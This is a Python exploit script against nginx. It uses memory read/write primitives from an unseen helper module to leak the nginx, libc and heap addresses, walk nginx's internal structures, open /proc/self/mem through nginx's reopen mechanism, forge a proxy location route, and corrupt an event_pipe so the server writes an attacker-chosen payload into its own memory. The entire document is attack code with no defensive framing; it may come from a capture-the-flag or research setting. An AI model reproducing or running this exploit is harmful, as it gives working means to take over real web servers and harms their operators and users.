import requests
import binascii
import time
import sys

from ngx_modules import *
from util import url, WORD_SIZE, read_word, relative_read, abs_read, write_mem, write_word
from pwn import *
from dissect import cstruct

cparser = cstruct.cstruct()

with open('ngx_types.h', 'r') as f:
    cparser.load(f.read())
   
#### FIND nginx base address using pointer in request struct

ngx_http_block_reading_offset = 0x64abb
req = relative_read(0, 1456)
ngx_http_block_reading = u64(req[48:48+8])

nginx_base = ngx_http_block_reading - ngx_http_block_reading_offset
NginxModule.nginx_base = nginx_base

print('nginx base located: 0x{:x}'.format(nginx_base))

#### MISC nginx offsets 

ngx_http_upstream_init_round_robin_peer = nginx_base + 0x0007c0a9
ngx_str_rbtree_insert_value = nginx_base + 0x00027824 # function that can help identify cycle
ngx_http_proxy_handler = nginx_base + 0x000a10c7
ngx_stack_ptr = nginx_base + 0x000f2f60
ngx_http_proxy_copy_filter = nginx_base + 0x0009e75a
ngx_http_upstream_output_filter = nginx_base + 0x000778be
ngx_reopen = nginx_base + 0x1121f8
payload_dest = nginx_base + 0x00046109

print('ngx_stack_ptr: 0x{:x}'.format(ngx_stack_ptr))
scratch = read_word(ngx_stack_ptr) 
print('scratch: 0x{:x}'.format(scratch))

#### find libc
dup2 = read_word(nginx_base + 0xe0070)
dup2_offset = 0x000eabf0

print('dup2: 0x{:x}'.format(dup2))

libc = dup2 - dup2_offset

print('libc: 0x{:x}'.format(libc))

# find heap

libc_heap_ptr = libc + 0x001bb2c8

heap_base = read_word(libc_heap_ptr)
heap_size = read_word(libc+0x001bc4c8) # main_arena.system_mem
heap_end = heap_base + heap_size

print('heap at 0x{:x} - 0x{:x}'.format(heap_base, heap_end))

class CacheLine:
    def __init__(self, addr, data):
        self.addr = addr
        self.data = data

class CachedMemReader:
    BLOCK_SIZE_LOG = 12
    BLOCK_SIZE = 1 << BLOCK_SIZE_LOG
    BLOCK_MASK = 0xfffffffffffff000
    CACHE_BLOCKS_LOG = 12
    CACHE_BLOCKS = 1 << CACHE_BLOCKS_LOG
    CACHE_MASK = 0xfff

    def __init__(self):
        self.counter = 0
        self.cache = [None for _ in range(self.CACHE_BLOCKS)]

    
    def fetch_remote(self, addr):
        base = addr & self.BLOCK_MASK
        offset = addr & ~self.BLOCK_MASK
        index = (addr >> self.BLOCK_SIZE_LOG) & self.CACHE_MASK
        print('fetching 0x{:x}'.format(base))
        block_data = abs_read(base, self.BLOCK_SIZE)
        self.cache[index] = CacheLine(base, block_data)
        return u64(block_data[offset:offset+8])

    def fetch_cached(self, addr):
        block = self.cache[(addr >> self.BLOCK_SIZE_LOG) & self.CACHE_MASK]
        offset = addr & ~self.BLOCK_MASK
        if block is not None and block.addr == (addr & self.BLOCK_MASK):
            return u64(block.data[offset:offset+8])
        return None

    def __getitem__(self, addr):
        val = self.fetch_cached(addr)
        if val is not None:
            return val
        return self.fetch_remote(addr)

    def get_words(self, addr, n):
        return [self[addr + i*8] for i in range(8)]
        
    def get_byte(self, addr):
        word = self[addr]
        return word & 0xff

    def get_bytes(self, addr, n):
        return bytes(self.get_byte(addr+i) for i in range(n))
        
reader = CachedMemReader()

struct_cycle_rbtree_insert_offset = 0x148
struct_cycle_conf_file_offset = 0x218
struct_cycle_conf_ctx_offset = 0
struct_cycle_listening_offset = 0xc0
struct_cycle_open_files_part_offset = 0x180

struct_listening_servers_offset = 0x58

struct_http_in_default_server_offset = 0x8

struct_ngx_http_core_srv_conf_ctx_offset = 0x28

struct_ngx_http_conf_ctx_loc_offset = 0x10

struct_ngx_http_core_loc_conf_static_locations_offset = 0x20

struct_ngx_http_location_tree_node_left_offset = 0x00
struct_ngx_http_location_tree_node_right_offset = 0x08
struct_ngx_http_location_tree_node_len_offset = 0x29
struct_ngx_http_location_tree_node_name_offset = 0x2a

struct_event_pipe_input_filter_offset = 0x48
struct_event_pipe_output_filter_offset = 0x58
struct_event_pipe_size = 0x118

def search_heap_for_cycle():
    for search in range(heap_base, heap_end, WORD_SIZE):
        w = reader[search]
        if w == ngx_str_rbtree_insert_value:
            cycle = search - struct_cycle_rbtree_insert_offset
            match = True
            for i in range(7):
                conf_str  = cycle + struct_cycle_conf_file_offset + i*WORD_SIZE*2
                if reader[conf_str] < 1024 and heap_base <= reader[conf_str + WORD_SIZE] < heap_end:
                    pass
                else:
                    match = False
                    break

            if match:
                return cycle


cycle = search_heap_for_cycle()
print('found cycle: 0x{:x}'.format(cycle))




conf_ctx = reader[cycle+struct_cycle_conf_ctx_offset]

listening = reader[cycle+struct_cycle_listening_offset]

# assuming only one listener


server = reader[listening + struct_listening_servers_offset]
http_in_addr = reader[server]

default_server = reader[http_in_addr + struct_http_in_default_server_offset]
ctx = reader[default_server + struct_ngx_http_core_srv_conf_ctx_offset]

loc_conf = reader[ctx + struct_ngx_http_conf_ctx_loc_offset]

print('loc conf: 0x{:x}'.format(loc_conf))

core_loc_conf = reader[loc_conf]

static_locations = reader[core_loc_conf + struct_ngx_http_core_loc_conf_static_locations_offset]

print('static locs: 0x{:x}'.format(static_locations))

node = static_locations
while True:
    print('found node: 0x{:x}'.format(node))
    right = reader[node + struct_ngx_http_location_tree_node_right_offset]
    if right != 0:
        node = right
    else:
        break


print('greatest node: 0x{:x}'.format(node))
name_len = reader.get_byte(node + struct_ngx_http_location_tree_node_len_offset)
name = reader.get_bytes(node + struct_ngx_http_location_tree_node_name_offset, name_len)
print('     {!r}'.format(name))


# opening /proc/self/mem

files_part = cparser.ngx_list_part_t(
    reader.get_bytes(cycle + struct_cycle_open_files_part_offset, 
        len(cparser.ngx_list_part_t))
)

open_file_size = len(cparser.ngx_open_file_t)
files_array = []
for i in range(files_part.nelts):
    open_file = cparser.ngx_open_file_t(
        reader.get_bytes(
            files_part.elts+i*open_file_size, 
            open_file_size
    ))
    files_array.append(open_file)


proc_mem = cparser.ngx_open_file_t()
files_array.append(proc_mem)

# build ngx_http_core_loc_conf_t struct with proxy handler

# TODO
my_path = '/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/'
n_modules = 60
file_path = b'/proc/self/mem\0'
proc_mem_str = b'/proc/self/mem\0'

word_consts = [
    -2,
]

upstream_name = b'http://127.0.0.1:5000'
payload = b'payload'

tree_node_addr = scratch
my_path_addr = scratch + len(cparser.ngx_http_location_tree_node_t) - 1
core_loc_conf_addr = my_path_addr + len(my_path)
loc_conf_addr = core_loc_conf_addr + len(cparser.ngx_http_core_loc_conf_t)
proxy_loc_conf_addr = loc_conf_addr + n_modules*WORD_SIZE
error_log_addr = proxy_loc_conf_addr + len(cparser.ngx_http_proxy_loc_conf_t)
word_consts_addr = error_log_addr + len(cparser.ngx_log_t)
upstream_conf_addr = word_consts_addr + len(word_consts)*WORD_SIZE
upstream_name_addr = upstream_conf_addr + len(cparser.ngx_http_upstream_srv_conf_s)
peers_addr = upstream_name_addr + len(upstream_name)
sockaddr_addr = peers_addr + len(cparser.ngx_http_upstream_rr_peers_t)
peer_addr = sockaddr_addr + len(cparser.sockaddr_in_t)
temp_file_addr = peer_addr + len(cparser.ngx_http_upstream_rr_peer_t)
path_addr = temp_file_addr + len(cparser.ngx_temp_file_t)
file_path_str_addr = path_addr + len(cparser.ngx_path_t)
files_array_addr = file_path_str_addr + len(file_path)
proc_mem_addr = files_array_addr + len(files_array)*open_file_size
proc_mem_str_addr = proc_mem_addr + len(cparser.ngx_open_file_t)
buf_t_addr =  proc_mem_str_addr + len(proc_mem_str)
payload_addr = buf_t_addr + len(cparser.ngx_buf_t)
end_addr = payload_addr + len(payload)

files_part.elts = files_array_addr
files_part.nelts += 1

proc_mem.fd = 0 # close stdin?
proc_mem.name.data = proc_mem_str_addr
proc_mem.name.len = len(proc_mem_str)

write_mem(proc_mem_str_addr, proc_mem_str)
write_mem(proc_mem_addr, proc_mem.dumps())
write_mem(files_array_addr,  b''.join(f.dumps() for f in files_array))
write_mem(cycle + struct_cycle_open_files_part_offset, files_part.dumps())
write_word(ngx_reopen, 1)

proc_mem = cparser.ngx_open_file_t(
    reader.get_bytes(
        files_part.elts + (files_part.nelts - 1)*open_file_size, 
        open_file_size
))

print('opened /proc/self/mem')
print(proc_mem)

# injecting proxy route

tree_node = cparser.ngx_http_location_tree_node_t()


tree_node.inclusive = core_loc_conf_addr
tree_node.auto_redirect = 0x1
tree_node.len = len(my_path)
tree_node.name = my_path.encode()

core_loc_conf = cparser.ngx_http_core_loc_conf_t()

core_loc_conf.name.len = len(my_path)
core_loc_conf.name.data = my_path_addr

#core_loc_conf.auto_redirect = 1
core_loc_conf.handler = ngx_http_proxy_handler
core_loc_conf.client_max_body_size = 0x100000
core_loc_conf.directio = 0x7fffffffffffffff
core_loc_conf.postpone_output = 0x5b4
core_loc_conf.subrequest_output_buffer_size = 0x1000
core_loc_conf.client_body_timeout = 0xea60
core_loc_conf.send_timeout = 0xea60
core_loc_conf.keepalive_timeout = 0xfde8
core_loc_conf.lingering_time = 0x7530
core_loc_conf.lingering_timeout = 0x1388
core_loc_conf.resolver_timeout = 0x7530
core_loc_conf.keepalive_requests = 0x64
core_loc_conf.keepalive_disable = 0x5
core_loc_conf.lingering_close = 0x1
core_loc_conf.if_modified_since = 0x1
core_loc_conf.max_ranges = 0x7fffffff
core_loc_conf.sendfile = 0x1
core_loc_conf.tcp_nodelay = 0x1
core_loc_conf.absolute_redirect = 0x1
core_loc_conf.port_in_redirect = 0x1
core_loc_conf.msie_padding = 0x1
core_loc_conf.log_not_found = 0x1
core_loc_conf.server_tokens = 0x1
core_loc_conf.chunked_transfer_encoding = 0x1
core_loc_conf.etag = 0x1
core_loc_conf.gzip_http_version = 0x3e9
core_loc_conf.gzip_proxied = 0x3
core_loc_conf.open_file_cache_valid = 0x3c
core_loc_conf.open_file_cache_min_uses = 0x1
core_loc_conf.types_hash_max_size = 0x400
core_loc_conf.types_hash_bucket_size = 0x40

core_loc_conf.loc_conf = loc_conf_addr
core_loc_conf.error_log = error_log_addr


loc_conf_arr = [0 for _ in range(n_modules)]
loc_conf_arr[ngx_http_proxy_module.ctx_index] = proxy_loc_conf_addr
loc_conf_arr[ngx_http_core_module.ctx_index] = core_loc_conf_addr
loc_conf_arr[ngx_http_rewrite_module.ctx_index] = error_log_addr # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_limit_req_module.ctx_index] = error_log_addr-8 # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_limit_conn_module.ctx_index] = error_log_addr-8 # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_access_module.ctx_index] = error_log_addr # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_auth_basic_module.ctx_index] = error_log_addr # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_try_files_module.ctx_index] = error_log_addr # just needs to point to anything (uint64)0
loc_conf_arr[ngx_http_mirror_module.ctx_index] = error_log_addr # just needs to point to anything (uint64)0

loc_conf_arr[ngx_http_headers_filter_module.ctx_index] = error_log_addr # needs to point to 5*(uint64)0
loc_conf_arr[ngx_http_userid_filter_module.ctx_index] = error_log_addr # needs to point to (uint64)0
loc_conf_arr[ngx_http_charset_filter_module.ctx_index] = word_consts_addr # needs to point to (uint64)-2
loc_conf_arr[ngx_http_ssi_filter_module.ctx_index] = error_log_addr # needs to point to (uint64)0
loc_conf_arr[ngx_http_gzip_filter_module.ctx_index] = error_log_addr # needs to point to (uint64)0
loc_conf_arr[ngx_http_copy_filter_module.ctx_index] = error_log_addr # needs to point to (uint64)0 ????
loc_conf_arr[ngx_http_log_module.ctx_index] = word_consts_addr - 0x20 # needs to point to nonzero

loc_conf_block = b''.join(p64(p) for p in loc_conf_arr)

proxy_loc_conf = cparser.ngx_http_proxy_loc_conf_t()

# lengths -> (any ptr) -> NULL
proxy_loc_conf.headers.lengths = loc_conf_addr + ngx_http_mirror_module.ctx_index*WORD_SIZE 

proxy_loc_conf.headers.values = proxy_loc_conf.headers.lengths # ditto
proxy_loc_conf.upstream.upstream = upstream_conf_addr
hour_ms = 1000*60*60
proxy_loc_conf.upstream.connect_timeout = hour_ms
proxy_loc_conf.upstream.send_timeout = hour_ms
proxy_loc_conf.upstream.read_timeout = hour_ms
proxy_loc_conf.upstream.buffer_size = 0x1000
proxy_loc_conf.upstream.hide_headers_hash.buckets = error_log_addr # needs to point to (uint64)0
proxy_loc_conf.upstream.hide_headers_hash.size = 1
proxy_loc_conf.upstream.ignore_headers = 1
proxy_loc_conf.upstream.buffering = 1
proxy_loc_conf.upstream.request_buffering = 1
#proxy_loc_conf.upstream.pass_request_headers = 1
#proxy_loc_conf.upstream.pass_request_body = 1
#proxy_loc_conf.upstream.change_buffering = 1


upstream_srv_conf = cparser.ngx_http_upstream_srv_conf_s()
upstream_srv_conf.host.data = upstream_name_addr
upstream_srv_conf.host.len = len(upstream_name)
upstream_srv_conf.peer.init = ngx_http_upstream_init_round_robin_peer
upstream_srv_conf.peer.data = peers_addr


peers = cparser.ngx_http_upstream_rr_peers_t()
peers.number = 1
peers.bitfield = 1 # single = 1, weighted = 0
peers.peer = peer_addr

sockaddr = cparser.sockaddr_in_t()
sockaddr.sin_family = 0x02 # AF_INET
sockaddr.sin_port = 0x8813 # htons(5000)
sockaddr.sin_addr = 0x0100007f # 127.0.0.1

peer = cparser.ngx_http_upstream_rr_peer_t()
peer.sockaddr = sockaddr_addr
peer.socklen = 0x10

error_log = cparser.ngx_log_t()


temp_file = cparser.ngx_temp_file_t()
temp_file.file.fd = proc_mem.fd
temp_file.path = path_addr

path = cparser.ngx_path_t()
path.name.data = file_path_str_addr
path.name.len = len(file_path)

write_mem(tree_node_addr, tree_node.dumps())

write_mem(core_loc_conf_addr, core_loc_conf.dumps())
write_mem(loc_conf_addr, loc_conf_block)
write_mem(proxy_loc_conf_addr, proxy_loc_conf.dumps())
write_mem(error_log_addr, error_log.dumps())
write_mem(word_consts_addr,  b''.join(p64(p & 0xffffffffffffffff) for p in word_consts))
write_mem(upstream_conf_addr, upstream_srv_conf.dumps())
write_mem(peers_addr, peers.dumps())
write_mem(sockaddr_addr, sockaddr.dumps())
write_mem(peer_addr, peer.dumps())
write_mem(path_addr, path.dumps())
write_mem(file_path_str_addr, file_path)


write_word(node + struct_ngx_http_location_tree_node_right_offset, tree_node_addr)


print('injected proxy route. initiating slow request')

def slow_req():
    print('sending slow req')
    try:
        requests.get(url+'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/')
    except:
        pass
    print('slow req complete?')
    

slow_req_thread = threading.Thread(target=slow_req)
slow_req_thread.start()
time.sleep(2)

reader = CachedMemReader()

def search_heap_for_event_pipe():
    for p in range(heap_base, heap_end - struct_event_pipe_size + 1, WORD_SIZE):
        if reader[p + struct_event_pipe_input_filter_offset] == ngx_http_proxy_copy_filter \
            and reader[p + struct_event_pipe_output_filter_offset] == ngx_http_upstream_output_filter:
                return p

p = search_heap_for_event_pipe()
print('found event_pipe: 0x{:x}'.format(p))

event_pipe = cparser.ngx_event_pipe_t(reader.get_bytes(p, struct_event_pipe_size))
print(event_pipe)

event_pipe.preread_bufs = 0
event_pipe.free_raw_bufs = 0
event_pipe.buf_to_file = buf_t_addr
event_pipe.flags |= 0x0000000000000002 # cacheable
event_pipe.temp_file = temp_file_addr

buf_t = cparser.ngx_buf_t()
buf_t.pos = payload_addr
buf_t.last = payload_addr + len(payload)


temp_file.pool = event_pipe.pool
temp_file.file.log = event_pipe.log
temp_file.offset = payload_dest

write_mem(payload_addr, payload)
write_mem(buf_t_addr, buf_t.dumps())
write_mem(temp_file_addr, temp_file.dumps())
write_mem(p, event_pipe.dumps())

